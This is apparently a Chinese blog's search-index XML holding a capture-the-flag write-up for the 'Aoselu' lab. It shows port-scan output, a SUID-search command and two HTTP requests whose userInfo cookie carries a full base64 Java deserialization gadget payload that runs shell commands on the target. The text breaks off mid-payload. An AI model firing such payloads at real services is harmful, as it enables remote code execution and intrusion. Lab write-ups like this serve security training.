<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>春秋云镜–Aoselu</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<h1 id="春秋云镜–Aoselu"><a href="#春秋云镜–Aoselu" class="headerlink" title="春秋云镜–Aoselu"></a>春秋云镜–Aoselu</h1><p>39.98.116.223</p><p>赛后复盘重打</p><p>写的不好，且比较乱，师傅自行判断借鉴</p><p>参考了官方的wp和一些其他的师傅的类型的打法wp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.98.116.223</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 2.0.0</span><br><span class="line">[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880</span><br><span class="line">[*] 开始信息扫描...</span><br><span class="line">[*] 最终有效主机数量: 1</span><br><span class="line">[*] 共解析 218 个有效端口</span><br><span class="line">[+] 端口开放 39.98.116.223:80</span><br><span class="line">[+] 端口开放 39.98.116.223:8080</span><br><span class="line">[+] 端口开放 39.98.116.223:22</span><br><span class="line">[+] 存活端口数量: 3</span><br><span class="line">[*] 开始漏洞扫描...</span><br><span class="line">[*] 网站标题 http://39.98.116.223      状态码:200 长度:33611  标题:Aoselu Automotive - Redefining Mobility</span><br><span class="line">[*] 网站标题 http://39.98.116.223:8080 状态码:200 长度:15978  标题:Aoselu Automotive - Email Login</span><br><span class="line">[!] 扫描错误 39.98.116.223:22 - 扫描总时间超时: context deadline exceeded</span><br><span class="line">[+] 扫描已完成: 3/3</span><br><span class="line">[*] 扫描结束,耗时: 20.8528663s</span><br></pre></td></tr></table></figure><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p>反序列化</p><p>根据提示</p><p>提示一：</p><ol><li>入口Email账号登录之后返回的cookie字段userInfo存在java反序列化</li><li>目标不出网</li></ol><p>提示2： 请尝试 cc 链获取回显，然后suid提权拿到入口机的flag</p><p>先生成payload</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/1.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/2.png"></p><p>将cookie直接改为payload，发包，rce成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/3.png"></p><p>这里可以直接打冰蝎内存马，比赛时没想到</p><p>接下来查看suid提权</p><h4 id="suid提权-cme-cve-2025-32463"><a href="#suid提权-cme-cve-2025-32463" class="headerlink" title="suid提权-cme&#x2F;cve-2025-32463"></a>suid提权-cme&#x2F;cve-2025-32463</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/4.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /mail/u/<span class="number">0</span>/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">138.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=<span class="number">8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=rO0ABXNyAFbBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaLBocGnwK7BlMGywaXBpcGCwaHBp5SVecHY59tsAwAAeHBzcgCEwa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGjwa/BrcGwwaHBssGhwbTBr8GywbPArsGUwbLBocGuwbPBpsGvwbLBrcGpwa7Bp8GDwa/BrcGwwaHBssGhwbTBr8GyL/mE8CuxCMwCAAJMABLBpMGlwaPBr8GywaHBtMGlwaR0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwYPBr8GtwbDBocGywaHBtMGvwbLAu0wAFsG0wbLBocGuwbPBpsGvwbLBrcGlwbJ0AFrBjMGvwbLBp8CvwaHBsMGhwaPBqMGlwK/Bo8Gvwa3BrcGvwa7Bs8CvwaPBr8GswazBpcGjwbTBqcGvwa7Bs8C0wK/BlMGywaHBrsGzwabBr8Gywa3BpcGywLt4cHNyAIDBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaPBr8GtwbDBocGywaHBtMGvwbLBs8CuwYPBr8GtwbDBocGywaHBosGswaXBg8Gvwa3BsMGhwbLBocG0wa/Bsvv0mSW4brE3AgAAeHBzcgB2wa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGmwbXBrsGjwbTBr8GywbPArsGJwa7BtsGvwavBpcGywZTBssGhwa7Bs8Gmwa/BssGtwaXBsofo/<span class="number">2</span>t7fM44AgADWwAKwanBgcGywafBs3QAJsGbwYzBqsGhwbbBocCvwazBocGuwafAr8GPwaLBqsGlwaPBtMC7TAAWwanBjcGlwbTBqMGvwaTBjsGhwa3BpXQAJMGMwarBocG2waHAr8GswaHBrsGnwK/Bk8G0wbLBqcGuwafAu1sAFsGpwZDBocGywaHBrcGUwbnBsMGlwbN0ACTBm8GMwarBocG2waHAr8GswaHBrsGnwK/Bg8GswaHBs8GzwLt4cHVyACbBm8GMwarBocG2waHArsGswaHBrsGnwK7Bj8GiwarBpcGjwbTAu5DOWJ8QcylsAgAAeHAAAAAAdAAcwa7BpcG3wZTBssGhwa7Bs8Gmwa/BssGtwaXBsnVyACTBm8GMwarBocG2waHArsGswaHBrsGnwK7Bg8GswaHBs8GzwLurFteuy81amQIAAHhwAAAAAHcEAAAAAXNyAHTBo8Gvwa3ArsGzwbXBrsCuwa/BssGnwK7BocGwwaHBo8GowaXArsG4waHBrMGhwa7ArsGpwa7BtMGlwbLBrsGhwazArsG4wbPBrMG0waPArsG0wbLBocG4wK7BlMGlwa3BsMGswaHBtMGlwbPBicGtwbDBrAlXT8FurKszAwAGSQAawZ/BqcGuwaTBpcGuwbTBjsG1wa3BosGlwbJJABzBn8G0wbLBocGuwbPBrMGlwbTBicGuwaTBpcG4WwAUwZ/BosG5wbTBpcGjwa/BpMGlwbN0AAbBm8GbwYJbAAzBn8GjwazBocGzwbNxAH4AC0wACsGfwa7BocGtwaVxAH4ACkwAIsGfwa/BtcG0wbDBtcG0wZDBssGvwbDBpcGywbTBqcGlwbN0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwZDBssGvwbDBpcGywbTBqcGlwbPAu3hwAAAAAP////<span class="number">91</span>cgAGwZvBm8<span class="built_in">GCS</span>/<span class="number">0</span>ZFWdn2zcCAAB4cAAAAAJ1cgAEwZvBgqzzF/gGCFTgAgAAeHAAAA2/yv66vgAAADQA1AoAIgBlCQA7AGYKAAwAZwgAaAoADABpCABqBwBrCQA7AGwKAAcAbQoAOwBuCgAMAG8HAHAIAHEKAHIAcwoADAB0CAB1CgAMAHYIAD4IAHcIAHgIAHkKAHoAewoAegB8CgB9AH4KAAcAfwcAgAoAgQCCCgCBAIMIAIQKAIUAhggAhwcAiAoAIACJBwCKCgCLAIwIAI0IAI4IAI8IAJAKACAAkQoAIgCSCACTCgCLAJQJADsAlQgAlggAlwkAOwCYCACZCgAHAJoKAAcAmwgAnAgAnQgAnggAnwgAoAgAoQgAogoAOwCjBwCkAQAJaGVhZGVyS2V5AQASTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQAGYWN0aW9uAQAIcG9zaXRpb24BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFExwYXlsb2FkL1NwcmluZ0VjaG87AQAFc3RhcnQBAAV2YXIxMQEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBwBwBKBwCAAQAERWNobwEAFihMamF2YS91dGlsL1NjYW5uZXI7KVYBAAdzY2FubmVyAQATTGphdmEvdXRpbC9TY2FubmVyOwEABHZhcjABABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjEBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABHZhcjIBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXI0AQAEdmFyNgEABHZhcjcBAAR2YXI4BwBrBwCIBwClBwCKAQAKRXhjZXB0aW9ucwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAD1NwcmluZ0VjaG8uamF2YQwAQQBCDAA/AD0MAKYApwEABGVjaG8MAKgAqQEABGV4ZWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAPgA9DABBAKoMAE8AUAwAqwCsAQAQamF2YS9sYW5nL1N0cmluZwEAB29zLm5hbWUHAK0MAK4ArwwAsACxAQADV0lODACyALMBAAIvYwEABy9iaW4vc2gBAAItYwcAtAwAtQC2DABqALcHALgMALkAugwAQQC7AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAvAwAvQC+DAC/AMABADxvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuUmVxdWVzdENvbnRleHRIb2xkZXIHAMEMAMIAwwEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzAQAPamF2YS9sYW5nL0NsYXNzDADEAMUBABBqYXZhL2xhbmcvT2JqZWN0BwClDADGAMcBAEBvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzAQALZ2V0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgwAyADFDADJAMoBAAlhZGRIZWFkZXIMAMsAzAwAQAA9AQAGaGVhZGVyAQAEYm9keQwAPAA9AQACXEEMAM0AzgwAzwCxAQAHcHJpbnRsbgEABWZsdXNoAQAFY2xvc2UBAARFdGFnAQAlZmluZCAvIC1wZXJtIC11PXMgLXR5cGUgZiAyPi9kZXYvbnVsbAEABGV4ZWMBAARib2R5DABIAEIBAAhTSm1TSnhrSAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEACGhhc2hDb2RlAQADKClJAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAHaXNFbXB0eQEAAygpWgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHANAMAEEAQgoA0QDSACEAOwDRAAAABAAIADwAPQAAAAgAPgA9AAAACAA/AD0AAAAIAEAAPQAAAAQAAQBBAEIAAQBDAAAALwABAAEAAAAFKrcA07EAAAACAEQAAAAGAAEAAAAGAEUAAAAMAAEAAAAFAEYARwAAAAkASABCAAEAQwAAAUgABAADAAAAvLIAAksCPCq2AAOrAAAAADMAAAACAC9qJQAAABoAL7iRAAAAKCoSBLYABZkAEwM8pwAOKhIGtgAFmQAFBDwbqwAAAAB5AAAAAgAAAAAAAAAaAAAAAQAAACq7AAdZsgAItwAJuAAKpwBSsgAItgALmgBJBr0ADE0SDbgADrYADxIQtgARmQAQLAMSElMsBBITU6cADSwDEhRTLAQSFVMsBbIACFO7AAdZuAAWLLYAF7YAGLcAGbgACqcABEuxAAEAAAC3ALoAGgADAEQAAAA+AA8AAAASAFgAFABlABUAaAAXAHEAGAB2ABkAhgAaAIsAGwCTAB0AmAAeAJ0AIACjACEAtwAmALoAJQC7ACcARQAAAAwAAQB2AEEASQBKAAIASwAAABwACv0AJAcATAENChoP/AAqBwBNCfgAGUIHAE4AAAoATwBQAAIAQwAAAk0ABwAKAAABZ7gAG7YAHBIdtgAeTCsSHwO9ACC2ACFNLAEDvQAitgAjTrgAG7YAHBIktgAeTCsSJQO9ACC2ACFNLC0DvQAitgAjOgS4ABu2ABwSJrYAHhInA70AILYAKDoFGQS2ACkSKgW9ACBZAxIMU1kEEgxTtgAoOgYZBgS2ACsZBQS2ACsZBRkEA70AIrYAIzoHsgAsOggCNgkZCLYAA6sAAAAAADgAAAACtzTijQAAABsALjmiAAAAKxkIEi22AAWZABYDNgmnABAZCBIutgAFmQAGBDYJFQmrAAAAkwAAAAIAAAAAAAAAGQAAAAEAAAA6GQYZBAW9ACJZA7IAL1NZBCoSMLYAMbYAMlO2ACNXpwBcGQe2ACkSMwS9ACBZAxIMU7YAKBkHBL0AIlkDKhIwtgAxtgAyU7YAI1cZB7YAKRI0A70AILYAKBkHA70AIrYAI1cZB7YAKRI1A70AILYAKBkHA70AIrYAI1exAAAAAwBEAAAASgASAAAAKQAMACoAFwArACEALAAtAC0AOAAuAEMALwBZADAAcwAxAHkAMgB/ADMAjAA1AOwANwEKADgBDQA6ATYAOwFOADwBZgA/AEUAAABSAAgAAAFnAFEAUgAAAAwBWwBTAFQAAQAXAVAAVQBWAAIAIQFGAFcAWAADAEMBJABZAFgABABZAQ4AWgBWAAUAcwD0AFsAVgAGAIwA2wBcAFgABwBLAAAALAAG/wC0AAoHAF0HAF4HAF8HAGAHAGAHAF8HAF8HAGAHAEwBAAAPDBog+QBYAGEAAAAEAAEAGgAIAGIAQgABAEMAAABEAAEAAAAAABgSNrMALxI3swAIEjizAAISObMALLgAOrEAAAABAEQAAAAaAAYAAAAHAAUACAAKAAkADwAKABQADAAXAA0AAQBjAAAAAgBkdXEAfgAYAAAA8sr+ur4AAAAxABMBAANGb28HAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACEZvby5qYXZhAQAUamF2YS9pby9TZXJpYWxpemFibGUHAAcBABBzZXJpYWxWZXJzaW9uVUlEAQABSgVx5mnuPG1HGAEADUNvbnN0YW50VmFsdWUBAAY8aW5pdD4BAAMoKVYMAA4ADwoABAAQAQAEQ29kZQAhAAIABAABAAgAAQAaAAkACgABAA0AAAACAAsAAQABAA4ADwABABIAAAARAAEAAQAAAAUqtwARsQAAAAAAAQAFAAAAAgAGcHQAAsGQcHcBAHh3BAAAAAF4</span><br><span class="line">Connection: keep<span class="literal">-alive</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/5.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/<span class="built_in">mount</span></span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/fusermount3</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/cmp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/lib/polkit<span class="literal">-1</span>/polkit<span class="literal">-agent-helper-1</span></span><br><span class="line">/usr/lib/snapd/snap<span class="literal">-confine</span></span><br><span class="line">/usr/lib/dbus<span class="literal">-1</span>.<span class="number">0</span>/dbus<span class="literal">-daemon-launch-helper</span></span><br><span class="line">/usr/lib/openssh/ssh<span class="literal">-keysign</span></span><br></pre></td></tr></table></figure><p>ls可以看到flag就在当前目录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /mail/u/<span class="number">0</span>/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">138.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=<span class="number">8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=rO0ABXNyAFbBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaLBocGnwK7BlMGywaXBpcGCwaHBp5SVecHY59tsAwAAeHBzcgCEwa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGjwa/BrcGwwaHBssGhwbTBr8GywbPArsGUwbLBocGuwbPBpsGvwbLBrcGpwa7Bp8GDwa/BrcGwwaHBssGhwbTBr8GyL/mE8CuxCMwCAAJMABLBpMGlwaPBr8GywaHBtMGlwaR0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwYPBr8GtwbDBocGywaHBtMGvwbLAu0wAFsG0wbLBocGuwbPBpsGvwbLBrcGlwbJ0AFrBjMGvwbLBp8CvwaHBsMGhwaPBqMGlwK/Bo8Gvwa3BrcGvwa7Bs8CvwaPBr8GswazBpcGjwbTBqcGvwa7Bs8C0wK/BlMGywaHBrsGzwabBr8Gywa3BpcGywLt4cHNyAIDBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaPBr8GtwbDBocGywaHBtMGvwbLBs8CuwYPBr8GtwbDBocGywaHBosGswaXBg8Gvwa3BsMGhwbLBocG0wa/Bsvv0mSW4brE3AgAAeHBzcgB2wa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGmwbXBrsGjwbTBr8GywbPArsGJwa7BtsGvwavBpcGywZTBssGhwa7Bs8Gmwa/BssGtwaXBsofo/<span class="number">2</span>t7fM44AgADWwAKwanBgcGywafBs3QAJsGbwYzBqsGhwbbBocCvwazBocGuwafAr8GPwaLBqsGlwaPBtMC7TAAWwanBjcGlwbTBqMGvwaTBjsGhwa3BpXQAJMGMwarBocG2waHAr8GswaHBrsGnwK/Bk8G0wbLBqcGuwafAu1sAFsGpwZDBocGywaHBrcGUwbnBsMGlwbN0ACTBm8GMwarBocG2waHAr8GswaHBrsGnwK/Bg8GswaHBs8GzwLt4cHVyACbBm8GMwarBocG2waHArsGswaHBrsGnwK7Bj8GiwarBpcGjwbTAu5DOWJ8QcylsAgAAeHAAAAAAdAAcwa7BpcG3wZTBssGhwa7Bs8Gmwa/BssGtwaXBsnVyACTBm8GMwarBocG2waHArsGswaHBrsGnwK7Bg8GswaHBs8GzwLurFteuy81amQIAAHhwAAAAAHcEAAAAAXNyAHTBo8Gvwa3ArsGzwbXBrsCuwa/BssGnwK7BocGwwaHBo8GowaXArsG4waHBrMGhwa7ArsGpwa7BtMGlwbLBrsGhwazArsG4wbPBrMG0waPArsG0wbLBocG4wK7BlMGlwa3BsMGswaHBtMGlwbPBicGtwbDBrAlXT8FurKszAwAGSQAawZ/BqcGuwaTBpcGuwbTBjsG1wa3BosGlwbJJABzBn8G0wbLBocGuwbPBrMGlwbTBicGuwaTBpcG4WwAUwZ/BosG5wbTBpcGjwa/BpMGlwbN0AAbBm8GbwYJbAAzBn8GjwazBocGzwbNxAH4AC0wACsGfwa7BocGtwaVxAH4ACkwAIsGfwa/BtcG0wbDBtcG0wZDBssGvwbDBpcGywbTBqcGlwbN0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwZDBssGvwbDBpcGywbTBqcGlwbPAu3hwAAAAAP////<span class="number">91</span>cgAGwZvBm8<span class="built_in">GCS</span>/<span class="number">0</span>ZFWdn2zcCAAB4cAAAAAJ1cgAEwZvBgqzzF/gGCFTgAgAAeHAAAA2cyv66vgAAADQA1AoAIgBlCQA7AGYKAAwAZwgAaAoADABpCABqBwBrCQA7AGwKAAcAbQoAOwBuCgAMAG8HAHAIAHEKAHIAcwoADAB0CAB1CgAMAHYIAD4IAHcIAHgIAHkKAHoAewoAegB8CgB9AH4KAAcAfwcAgAoAgQCCCgCBAIMIAIQKAIUAhggAhwcAiAoAIACJBwCKCgCLAIwIAI0IAI4IAI8IAJAKACAAkQoAIgCSCACTCgCLAJQJADsAlQgAlggAlwkAOwCYCACZCgAHAJoKAAcAmwgAnAgAnQgAnggAnwgAoAgAoQgAogoAOwCjBwCkAQAJaGVhZGVyS2V5AQASTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQAGYWN0aW9uAQAIcG9zaXRpb24BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFExwYXlsb2FkL1NwcmluZ0VjaG87AQAFc3RhcnQBAAV2YXIxMQEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBwBwBKBwCAAQAERWNobwEAFihMamF2YS91dGlsL1NjYW5uZXI7KVYBAAdzY2FubmVyAQATTGphdmEvdXRpbC9TY2FubmVyOwEABHZhcjABABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjEBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABHZhcjIBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXI0AQAEdmFyNgEABHZhcjcBAAR2YXI4BwBrBwCIBwClBwCKAQAKRXhjZXB0aW9ucwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAD1NwcmluZ0VjaG8uamF2YQwAQQBCDAA/AD0MAKYApwEABGVjaG8MAKgAqQEABGV4ZWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAPgA9DABBAKoMAE8AUAwAqwCsAQAQamF2YS9sYW5nL